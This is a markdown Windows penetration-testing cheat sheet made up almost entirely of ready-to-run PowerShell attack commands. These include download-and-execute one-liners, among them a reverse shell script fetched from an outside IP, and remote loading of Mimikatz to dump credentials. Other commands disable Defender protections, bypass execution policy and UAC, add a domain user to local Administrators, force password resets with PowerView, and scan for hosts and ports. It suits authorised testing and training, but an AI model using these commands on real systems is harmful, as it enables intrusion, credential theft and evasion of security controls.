# Windows

## Install Windows Terminal

- [Windows Terminal](https://github.com/microsoft/terminal/releases)

## Install Kali WSL 

1. [Enable Virtual Platform & WSL features Windows](https://www.configserverfirewall.com/windows-10/please-enable-the-virtual-machine-platform-windows-feature-and-ensure-virtualization-is-enabled-in-the-bios/)
2. Install latest Kali Linux from Microsoft Store (Microsoft account not required)

## Download file

```powershell
certutil.exe -urlcache -f <url> <outfile>

iwr -uri <file_url> -Outfile <outfile>
```

## Download & Exec

```powershell
iex (New-Object Net.Webclient).DownloadString("<remote_ps1>")

# Reverse powershell x64
c:\windows\sysnative\windowspowershell\v1.0\powershell.exe IEX(new-object net.webclient).downloadstring('http://10.10.14.12/Invoke-PowerShellTcp.ps1')


$ss = New-PSSession -ComputerName <target>
Enter-PSSession -Session $ss
Invoke-Command -Session $ss -ScriptBlock { iwr -uri http://192.168.56.2/Invoke-Mimikatz.ps1 -OutFile .\Invoke-Mimikatz.ps1 ; . .\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz }
```

---

## Runas

```bash
runas /netonly /user:<domain\user> "C:\Program Files\file.exe"
```

## Execution Policy

```powershell
powershell -ep bypass
```

## Contrained Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode

Invoke-Command -Session $ss -ScriptBlock  {$ExecitonContext,SessionState,LanguageMode}

```

## Applocker check

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty rulecollections
```

## AV disable

```powershell
Set-MpPreference -DisableRealTimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
```

## UAC bypass

```powershell
Invoke-EventVwrBypass -Command "powershell.exe whoami /all"
```

## Impersonate 

```powershell
# PlainText
$Password = ConvertTo-SecureString "<pass>" -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential("<domain\user>", $Password);
Invoke-Command -ComputerName <target> -ScriptBlock { hostname; whoami } -Credential $Credential

# SecureString
$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000028bf2'
$passwd = $securepasswd | ConvertTo-SecureString
$passwd System.Security.SecureString
$creds = New-Object System.Management.Automation.PSCredential ("<domain>\administrator", $passwd)
Invoke-Command -ScriptBlock {net localgroup Administrators <domain>\<user> /add} -ComputerName <target> -Credential $creds
```

## Pivot

```powershell
$secure = New-PSSession -ComputerName <target>
Enter-PSSession -Session $secure
```

---

## Import PS1 module

```powershell
import-module <ps1_file>
. ./<ps1_file>
```
> Full path is sometimes mandatory for Import-Module !


## PS remoting

```powershell
New-PSSession -ComputerName <target.fqdn>
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Session $true

$sess = New-PSSession -ComputerName <target.fqdn>
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```



## Force Change password

```powershell
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString '<pwned_user_pass>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain\user>', $SecPassword)
$UserPassword = ConvertTo-SecureString '<target_user_newpass>' -AsPlainText -Force
Set-DomainUserPassword -Identity prodadmin -AccountPassword $UserPassword -Crendential $Cred

Set-ADAccountPassword -Identity <target_user> -NewPassword (ConvertTo-SecureString -AsPlainText '<new_pass>' -Force)
```



## Ping Scans

```powershell
1..255| foreach {Test-Connection -ComputerName "192.168.1.$_"}
```

---

## Port Scan

```powershell
1..1024 | % { echo ((new-object Net.Sockets.TcpClient).Connect("<target>",$_)) "$_ is open" } 2>out-null
```
